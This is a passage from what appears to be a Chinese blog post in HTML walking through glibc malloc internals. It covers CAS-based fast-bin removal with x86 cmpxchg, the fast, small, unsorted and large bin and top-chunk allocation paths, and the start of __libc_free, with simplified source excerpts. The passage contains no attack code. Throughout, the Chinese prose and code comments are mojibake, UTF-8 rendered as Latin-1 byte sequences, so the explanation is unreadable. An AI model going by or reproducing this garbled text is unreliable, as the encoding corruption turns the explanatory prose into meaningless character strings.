·æ—¶å°†å†…å­˜ä¸­çš„æ•°æ®æ›¿æ¢ä¸ºæ–°çš„å€¼ã€‚</p><p>CASéœ€è¦æœ‰3ä¸ªæ“ä½œæ•°ï¼šå†…å­˜åœ°å€Vï¼Œæ—§çš„é¢„æœŸå€¼Aï¼Œå³å°†è¦æ›´æ–°çš„ç›®æ ‡å€¼Bï¼ŒCASæŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œå½“ä¸”ä»…å½“å†…å­˜åœ°å€Vçš„å€¼ä¸é¢„æœŸå€¼Aç›¸ç­‰æ—¶ï¼Œå°†å†…å­˜åœ°å€Vçš„å€¼ä¿®æ”¹ä¸ºBï¼Œå¦åˆ™å°±ä»€ä¹ˆéƒ½ä¸åšï¼Œæ•´ä¸ªæ¯”è¾ƒå¹¶æ›¿æ¢çš„æ“ä½œæ˜¯ä¸€ä¸ªåŸå­æ“ä½œï¼Œä¸‹é¢ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)                     \</span></span><br><span class="line"><span class="meta">  do &#123;                                                \</span></span><br><span class="line"><span class="meta">    victim = pp;                                      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (victim == NULL)                               \</span></span><br><span class="line"><span class="meta">      break;                                          \</span></span><br><span class="line"><span class="meta">    pp = REVEAL_PTR(victim-&gt;fd);                      \</span></span><br><span class="line"><span class="meta">  &#125; while ((pp = catomic_compare_and_exchange_val_acq \</span></span><br><span class="line"><span class="meta">      (fb, pp, victim)) != victim);</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™æ®µä»£ç æ˜¯ç”¨æ¥ä»fast binä¸­åˆ é™¤ä¸€ä¸ªchunkï¼Œæˆ‘ä»¬è¿™é‡Œåªå…³æ³¨<em>catomic_compare_and_exchange_val_acq(fb, pp, victim)</em>è¿™ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå…¶ä¸­fbæ˜¯è¡¨å¤´ï¼Œppæ–°çš„èŠ‚ç‚¹ï¼Œvictimæ˜¯è€çš„èŠ‚ç‚¹ï¼Œéœ€è¦æŠŠè€èŠ‚ç‚¹åˆ æ‰ï¼ŒæŠŠæ–°èŠ‚ç‚¹æ¥ä¸Šï¼Œè¿™ä¸ªè°ƒç”¨å°±æ˜¯é€šè¿‡CASæ“ä½œä¿è¯thread-safeçš„ï¼Œä»¥x86å¹³å°ä¸ºä¾‹ï¼Œä¸€ç›´å¾€ä¸‹è¿½ï¼Œæœ€åº•å±‚çš„å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __arch_c_compare_and_exchange_val_32_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123;                                                                  \</span></span><br><span class="line"><span class="meta">    __typeof(*mem) ret;                                               \</span></span><br><span class="line"><span class="meta">    __asm __volatile(<span class="string">&quot;cmpl $0, %%&quot;</span> SEG_REG <span class="string">&quot;:%P5\n\t&quot;</span>                 \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;je 0f\n\t&quot;</span>                                      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;lock\n&quot;</span>                                         \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;0:\tcmpxchgl %2, %1&quot;</span>                            \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=a&quot;</span>(ret), <span class="string">&quot;=m&quot;</span>(*mem)                          \</span></span><br><span class="line"><span class="meta">                     : BR_CONSTRAINT(newval), <span class="string">&quot;m&quot;</span>(*mem), <span class="string">&quot;0&quot;</span>(oldval), \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span>(offsetof(tcbhead_t, multiple_threads)));   \</span></span><br><span class="line"><span class="meta">    ret;                                                              \</span></span><br><span class="line"><span class="meta">  &#125;)</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€æ®µx86çš„å†…è”æ±‡ç¼–ï¼ŒGCCçš„å†…è”æ±‡ç¼–è¯­æ³•å¤§å®¶å¯ä»¥è‡ªè¡ŒæŸ¥é˜…ç›¸å…³èµ„æ–™ï¼Œè¿™é‡Œåªå…³æ³¨lockå’Œcmpxchglè¿™ä¸¤ä¸ªæŒ‡ä»¤ï¼Œlockç¡®ä¿å¯¹å†…å­˜çš„read/writeæ“ä½œåŸå­æ‰§è¡Œï¼Œcmpxchglç”¨æ¥æ¯”è¾ƒå¹¶äº¤æ¢æ“ä½œæ•°ï¼Œæ‰€ä»¥å½’æ ¹ç»“åº•ï¼ŒCASæ“ä½œè¿˜æ˜¯é€šè¿‡ç¡¬ä»¶æŒ‡ä»¤çš„æ”¯æŒæ‰èƒ½å®ç°åŸå­æ“ä½œã€‚</p><h3 id="ä»fastbinåˆ†é…"><a href="#ä»fastbinåˆ†é…" class="headerlink" title="ä»fastbinåˆ†é…"></a>ä»fastbinåˆ†é…</h3><p>åœ¨_int_mallocçš„å¼€å§‹ï¼Œå…ˆçœ‹ç”³è¯·çš„å†…å­˜å¤§å°nbæ˜¯å¦ç¬¦åˆfast binçš„é™åˆ¶ï¼Œç¬¦åˆçš„è¯ï¼Œé¦–å…ˆè¿›å…¥fast binçš„åˆ†é…ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nb &lt;= get_max_fast()) &#123;</span><br><span class="line">  idx = fastbin_index(nb);</span><br><span class="line">  mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">  mchunkptr pp;</span><br><span class="line">  <span class="keyword">if</span> ((victim = *fb) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    REMOVE_FB(fb, pp, victim);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šæ ¹æ®nbå¾—åˆ°fast binçš„indexï¼Œå†æ ¹æ®indexï¼Œå¾—åˆ°æŒ‡å‘æ‰€åœ¨binçš„headæŒ‡é’ˆfbï¼Œå¦‚æœè¿™ä¸ªbinéç©ºï¼Œåˆ™å–ç¬¬ä¸€ä¸ªchunkï¼Œä½¿ç”¨å‰é¢ä»‹ç»çš„REMOVE_FBå°†å…¶ä»æ‰€åœ¨binåˆ é™¤ï¼Œå¹¶å°†å–åˆ°çš„chunkè¿”å›ã€‚</p><h3 id="ä»smallbinåˆ†é…"><a href="#ä»smallbinåˆ†é…" class="headerlink" title="ä»smallbinåˆ†é…"></a>ä»smallbinåˆ†é…</h3><p>ä¸ç¬¦åˆfast binåˆ†é…æ¡ä»¶çš„è¯ï¼Œä¼šç»§ç»­çœ‹æ˜¯å¦ç¬¦åˆsmall binçš„åˆ†é…æ¡ä»¶ï¼Œè¿™éƒ¨åˆ†çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">  idx = smallbin_index(nb);</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">    bin-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      set_non_main_arena(victim);</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å¤„ç†è¿‡ç¨‹å’Œfast binç±»ä¼¼ï¼Œä¹Ÿæ˜¯æ ¹æ®nbå®šä½åˆ°æ‰€åœ¨çš„binï¼Œæ‰€åœ¨binéç©ºçš„è¯ï¼Œå°±åˆ†é…æˆåŠŸï¼Œè¿”å›å¾—åˆ°çš„chunkï¼Œå¹¶ä¸”ä»æ‰€åœ¨binä¸­åˆ é™¤ï¼Œå’Œfast binçš„æœ€å¤§ä¸åŒä¹‹å¤„åœ¨äºè¿™é‡Œæ“ä½œçš„æ˜¯åŒå‘é“¾è¡¨ã€‚</p><h3 id="merge-fast-bin-into-unsorted-bin"><a href="#merge-fast-bin-into-unsorted-bin" class="headerlink" title="merge fast bin into unsorted bin"></a><strong>merge fast bin into unsorted bin</strong></h3><p>åœ¨fast binå’Œsmall binéƒ½åˆ†é…å¤±è´¥ä¹‹åï¼Œä¼šæŠŠfast binä¸­çš„chunkè¿›è¡Œä¸€æ¬¡æ•´ç†åˆå¹¶ï¼Œç„¶åå°†åˆå¹¶åçš„chunkæ”¾å…¥unsorted binä¸­ï¼Œè¿™æ˜¯é€šè¿‡malloc_consolidateè¿™ä¸ªå‡½æ•°å®Œæˆçš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="comment">// å› ä¸ºè¿™é‡Œä¼šreleaseæ‰€æœ‰çš„fast binï¼Œæ‰€ä»¥å…ˆæŠŠç›¸åº”flag disable</span></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line">  maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// ä¸¤å±‚å¾ªç¯</span></span><br><span class="line">  <span class="comment">// 1. å¤–å±‚å¾ªç¯éå†æ‰€æœ‰fast bin</span></span><br><span class="line">  <span class="comment">// 2. å†…å±‚å¾ªç¯éå†binä¸­æ‰€æœ‰chunk</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// å†…å±‚å¾ªç¯ä¸»è¦åšäº†ä¸‹é¢å‡ ä»¶äº‹ï¼Œä»£ç å¤ªé•¿ï¼Œç•¥äº†</span></span><br><span class="line">        <span class="comment">// 1. å¦‚æœå½“å‰chunkçš„å‰ä¸€ä¸ªchunkæ˜¯freeçŠ¶æ€ï¼Œè¿›è¡Œåˆå¹¶</span></span><br><span class="line">        <span class="comment">// 2. å¦‚æœå½“å‰chunkçš„åä¸€ä¸ªchunkæ˜¯freeçŠ¶æ€ï¼Œè¿›è¡Œåˆå¹¶</span></span><br><span class="line">        <span class="comment">// 3. å¦‚æœåˆå¹¶åçš„chunkä¸å’Œtop chunkæŒ¨ç€ï¼Œ</span></span><br><span class="line">        <span class="comment">//    å°†åˆå¹¶åçš„chunkæ’å…¥åˆ°unsorted binä¸­</span></span><br><span class="line">        <span class="comment">// 4. å¦‚æœåˆå¹¶åçš„chunkå’Œtop chunkæŒ¨ç€ï¼Œ</span></span><br><span class="line">        <span class="comment">//    é‡æ–°è®¾ç½®top chunkçš„èµ·å§‹ä½ç½®</span></span><br><span class="line">      &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å°è¯•ä»unsorted-binä¸­åˆ†é…"><a href="#å°è¯•ä»unsorted-binä¸­åˆ†é…" class="headerlink" title="å°è¯•ä»unsorted binä¸­åˆ†é…"></a><strong>å°è¯•ä»unsorted binä¸­åˆ†é…</strong></h3><p>è¿™éƒ¨åˆ†ä»£ç å·²ç»è¿›å…¥_int_mallocä¸­æœ€åé‚£ä¸ªæœ€å¤§çš„forå¾ªç¯äº†ï¼Œè¿™éƒ¨åˆ†çš„å·¥ä½œåœ¨forå¾ªç¯çš„åˆšå¼€å§‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// forå¾ªç¯çš„ç¬¬ä¸€éƒ¨åˆ†ä»£ç </span></span><br><span class="line">  <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line">    mchunkptr next = chunk_at_offset(victim, size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ç¬¦åˆè¿™å››ä¸ªæ¡ä»¶çš„è¯ï¼Œä»last remainder chunkåˆ†é…</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb) </span><br><span class="line">        &amp;&amp; bck == unsorted_chunks(av) </span><br><span class="line">        &amp;&amp; victim == av-&gt;last_remainder </span><br><span class="line">        &amp;&amp; size &gt; (nb + MINSIZE)) &#123;</span><br><span class="line">      <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">    <span class="comment">// æ­£å¥½é‡åˆ°è¯·æ±‚å¤§å°çš„chunkï¼Œåˆ†é…æˆåŠŸ</span></span><br><span class="line">    <span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">      <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å½“å‰chunkå±äºsmall binçš„èŒƒå›´ï¼Œå°†å…¶æ”¾å›small bin</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">      <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// å½“å‰chunkå±äºlarge binçš„èŒƒå›´ï¼Œå°†å…¶æ”¾å›large bin</span></span><br><span class="line">      <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»unsorted binä¸­åˆ é™¤å½“å‰chunk</span></span><br><span class="line">    <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ¤æ–­æœ€å¤§å¾ªç¯æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (++iters &gt;= <span class="number">10000</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å°è¯•ä»large-binä¸­åˆ†é…"><a href="#å°è¯•ä»large-binä¸­åˆ†é…" class="headerlink" title="å°è¯•ä»large binä¸­åˆ†é…"></a>å°è¯•ä»large binä¸­åˆ†é…</h3><p>è¿™æ˜¯_int_mallocä¸­æœ€åé‚£ä¸ªå¤§forå¾ªç¯çš„ç¬¬äºŒéƒ¨åˆ†ä»£ç ï¼Œåœ¨ä»unsorted binåˆ†é…å¤±è´¥ä¹‹åï¼Œå‡†å¤‡ä»large binåˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// forå¾ªç¯çš„ç¬¬äºŒéƒ¨åˆ†ä»£ç </span></span><br><span class="line">  <span class="comment">// åˆ¤æ–­nbçš„å¤§å°ï¼Œç¬¦åˆæ¡ä»¶çš„è¯ä»large binåˆ†é…</span></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ¤æ–­å‰é¢å¾—åˆ°çš„binæ˜¯å¦ä¸ºç©º</span></span><br><span class="line">    <span class="comment">// ä¸ä¸ºç©ºçš„è¯æœ€å¤§çš„chunk sizeæ˜¯å¦å¤§äºç­‰äºè¯·æ±‚å¤§å°nb</span></span><br><span class="line">    victim = first(bin);</span><br><span class="line">    <span class="keyword">if</span> (victim != bin &amp;&amp; chunksize_nomask(victim) &gt;= nb) &#123;</span><br><span class="line">      <span class="comment">// 1. ç”¨best fitç®—æ³•æ‰¾åˆ°æœ€åˆé€‚å¤§å°çš„chunk</span></span><br><span class="line">      <span class="comment">// 2. å¯¹è¿™ä¸ªchunkè¿›è¡Œsplitï¼Œä¸€éƒ¨åˆ†è¿”å›ç»™ç”¨æˆ·ï¼Œ</span></span><br><span class="line">      <span class="comment">// å‰©ä½™éƒ¨åˆ†èµ‹å€¼ç»™malloc_stateä¸­çš„remainderï¼Œ</span></span><br><span class="line">      <span class="comment">// åŒæ—¶æ’å…¥åˆ°unsorted binå½“ä¸­</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// åœ¨è¯·æ±‚å¤§å°nbæ‰€åœ¨çš„binåˆ†é…å¤±è´¥ï¼Œç»§ç»­ä»åé¢çš„binæ¥åˆ†é…ï¼Œ</span></span><br><span class="line">  <span class="comment">// åœ¨æŸ¥æ‰¾åé¢binçš„è¿‡ç¨‹ä¸­ï¼Œä¼šç”¨åˆ°binmapæ¥åŠ å¿«æŸ¥æ‰¾é€Ÿåº¦</span></span><br><span class="line">  ++idx;</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line">  block = idx2block(idx);</span><br><span class="line">  <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">  bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœåé¢æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„binï¼Œå°±è·³åˆ°use_topä½¿ç”¨top chunkæ¥åˆ†é…</span></span><br><span class="line">    <span class="comment">// å¦‚æœåé¢æ‰¾åˆ°äº†åˆé€‚çš„binï¼Œé‚£ä¹ˆï¼š</span></span><br><span class="line">    <span class="comment">// 1. ç”¨best fitç®—æ³•æ‰¾åˆ°æœ€åˆé€‚å¤§å°çš„chunk</span></span><br><span class="line">    <span class="comment">// 2. å¯¹è¿™ä¸ªchunkè¿›è¡Œsplitï¼Œä¸€éƒ¨åˆ†è¿”å›ç»™ç”¨æˆ·ï¼Œ</span></span><br><span class="line">    <span class="comment">// å‰©ä½™éƒ¨åˆ†èµ‹å€¼ç»™malloc_stateä¸­çš„remainderï¼Œ</span></span><br><span class="line">    <span class="comment">// åŒæ—¶æ’å…¥åˆ°unsorted binå½“ä¸­</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å°è¯•ä»top-chunkä¸­åˆ†é…"><a href="#å°è¯•ä»top-chunkä¸­åˆ†é…" class="headerlink" title="å°è¯•ä»top chunkä¸­åˆ†é…"></a>å°è¯•ä»top chunkä¸­åˆ†é…</h3><p>è¿™æ˜¯_int_mallocä¸­æœ€åé‚£ä¸ªå¤§forå¾ªç¯çš„ç¬¬ä¸‰éƒ¨åˆ†ä»£ç ï¼Œåœ¨ä»large binåˆ†é…å¤±è´¥ä¹‹åï¼Œå‡†å¤‡ä»top chunkåˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// forå¾ªç¯çš„ç¬¬ä¸‰éƒ¨åˆ†ä»£ç </span></span><br><span class="line">  <span class="comment">// å‰é¢éƒ½åˆ†é…å¤±è´¥ï¼Œä»top chunkåˆ†é…</span></span><br><span class="line">use_top:</span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= (nb + MINSIZE)) &#123;</span><br><span class="line">    <span class="comment">// top chunkçš„å¤§å°å¦‚æœæ»¡è¶³è¦æ±‚ï¼Œåˆ†é…æˆåŠŸ</span></span><br><span class="line">    <span class="comment">// å‰©ä½™çš„éƒ¨åˆ†æˆä¸ºæ–°çš„top chunkï¼ŒåŒæ—¶ä¹Ÿä¼šæˆä¸ºremainder</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, ...);</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (av-&gt;have_fastchunks) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœfast bin flagè¢«è®¾ç½®ï¼Œ</span></span><br><span class="line">    <span class="comment">// å†é‡æ–°release fast binçš„å†…å®¹åˆ°unsorted binä¸­ï¼Œ</span></span><br><span class="line">    <span class="comment">// å¹¶ä¸”é‡æ–°å¾—åˆ°è¯·æ±‚å¤§å°æ‰€åœ¨binçš„index</span></span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœtop chunkä¹Ÿä¸æ»¡è¶³è¯·æ±‚å¤§å°ï¼Œ</span></span><br><span class="line">    <span class="comment">// å°±ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å¢åŠ top chunkï¼Œæˆ–è€…å†å¼€è¾Ÿå‡ºä¸€å—heap</span></span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="freeå…¥å£"><a href="#freeå…¥å£" class="headerlink" title="freeå…¥å£"></a>freeå…¥å£</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem) &#123;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = </span><br><span class="line">        atomic_forced_read(__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// part3</span></span><br><span class="line">  mchunkptr p = mem2chunk(mem);</span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mstate ar_ptr = arena_for_chunk(p);</span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç åˆ†æˆäº†part1/2/3ä¸‰éƒ¨åˆ†ï¼š</p><ul><li>part1ï¼šè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œè¿½ä»£ç å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªå›è°ƒå‡½æ•°ä¸ºNULL</li><li>part2ï¼šå…è®¸free(0)è¿™æ 